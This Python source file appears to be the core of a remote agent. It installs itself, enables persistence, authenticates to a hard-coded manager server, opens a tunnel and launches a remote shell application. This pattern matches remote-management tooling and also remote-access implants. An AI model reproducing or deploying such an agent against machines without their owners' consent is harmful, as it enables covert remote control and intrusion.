# Library import
from .events import EventManager
from .registry import ServiceRegistry
from .runtime import CoreRuntime
from .environment import RuntimeEnvironment

from src.subsystems.identity import IdentityManager
from src.subsystems.manager import ManagerSubsystem
from src.subsystems.session import SessionManager
from src.subsystems.tunnel import TunnelManager
from src.subsystems.communication import CommunicationSubsystem
from src.subsystems.app import AppManager
from src.subsystems.app.shell import ShellApplication
from src.subsystems.storage import StorageManager
from src.subsystems.install import InstallationManager
from src.subsystems.settings import SettingsManager
from src.subsystems.persistence import PersistenceManager
from src.subsystems.bootstrap import BootstrapService
from src.subsystems.integration import IntegrationManager
from src.subsystems.logger import LoggingService

import sys

# Classes definition
class AgentCore:
	ELEMENT_NAME: str = "AGENT-CORE"

	def __init__(self):
		self.events = EventManager()
		self.services = ServiceRegistry()
		self.runtime = CoreRuntime()
		self.runtime_environment = RuntimeEnvironment()

		self.storage = StorageManager(self); self.services.register("storage", self.storage)
		self.logger = LoggingService(self); self.services.register("logger", self.logger)
		self.identity = IdentityManager(self); self.services.register("identity", self.identity)
		self.manager = ManagerSubsystem(self); self.services.register("manager",self.manager)
		self.session = SessionManager(self); self.services.register("session", self.session)
		self.tunnel = TunnelManager(self); self.services.register("tunnel", self.tunnel)
		self.communication = CommunicationSubsystem(self); self.services.register("communication", self.communication)
		self.install = InstallationManager(self); self.services.register("install", self.install)
		self.setting = SettingsManager(self); self.services.register("setting", self.setting)
		self.persistence = PersistenceManager(self); self.services.register("persistence", self.persistence)
		self.bootstrap = BootstrapService(self); self.services.register("bootstrap", self.bootstrap)
		self.integration = IntegrationManager(self); self.services.register("integration", self.integration)
		self.app = AppManager(self); self.services.register("app", self.app)
		self.app.register(
			"shell",
			ShellApplication
		)

	async def start(self) -> bool:
		# Configure manager
		self.runtime.manager_address = "www.fortaprest.org"
		self.runtime.manager_port = 443
		self.runtime.manager_protocol = "https"

		await self.storage.start()
		await self.logger.start()
		await self.bootstrap.start()
		await self.identity.start()

		self.logger.info(source=self.ELEMENT_NAME, message="Initializing kernel")

		# Verify entity identity existence
		if not self.identity.exists():
			# Create identity
			print(f"[AGENT] Creating Agent Entity Identity...")
			self.identity.create(name="AGENT")
		else:
			# Load identity
			print(f"[AGENT] Agent Entity Identity:")
			agent_identity = self.identity.load()
			agent_public_identity = agent_identity.get('public')
			agent_private_identity = agent_identity.get('private')

			#print(agent_identity)
			print(f"[AGENT]    UID: {agent_public_identity.get('identification').get('uid')}")
			print(f"[AGENT]    PIK: {agent_public_identity.get('cryptographic_identity').get('public_key')}")


		await self.install.is_installed()
		program = await self.install.install()
		
		await self.persistence.install(
			executable=program
		)
		await self.persistence.enable()

		print(f"[AGENT] Persistence status:")
		print(await self.persistence.status())
		
		await self.communication.start()
		await self.setting.start()

		print(f"[AGENT] Known peers:")
		print(await self.communication.query_peers())

		print(f"[AGENT] Updating peers:")
		await self.communication.update_peers(
			{
				"peers":[
					{
						"transport":"TCP",
						"address":"0.0.0.0"
					},

					{
						"transport":"UDP",
						"address":"0.0.0.0"
					}
				]
			}
		)


		#import time
		#print(f"[AGENT] Waiting until uninstall...")
		#time.sleep(30)
		#await self.persistence.disable()
		#await self.persistence.uninstall()
		#await self.install.uninstall()
		
		# Authenticate
		client_auth_result = await self.manager.client_authenticate()
		server_auth_result = await self.manager.server_authenticate()

		self.runtime.auth_token = client_auth_result
		self.runtime.authenticated = True

		print(client_auth_result)
		print(server_auth_result)

		await self.integration.start()

		# Integrate to domain (optional)
		if "--integrate" in self.runtime_environment.arguments and len(self.runtime_environment.arguments[2]) != 0:
			security_code = sys.argv[2]
			print(f"[AGENT] Integrating agent with security code: {security_code}...")
			result = await self.manager.open_integration(
				auth_token=self.runtime.auth_token,
				security_code=security_code,
				entity_type="AGENT"
			)

			print(result)

		# Request tunnel
		tunnel_request = await self.tunnel.request_tunnel()
		self.runtime.tunnel_host = self.runtime.manager_address
		self.runtime.tunnel_port = tunnel_request.get('tunnel_port')
		self.runtime.tunnel_token = tunnel_request.get('tunnel_token')
		self.runtime.tunnel_authorized = True

		# Communication connect
		await self.communication.connect()

		await self.app.run(
			"shell",
		)

		self.logger.info(source=self.ELEMENT_NAME, message="Ending core")

		return True

	async def stop(self) -> bool:
		return True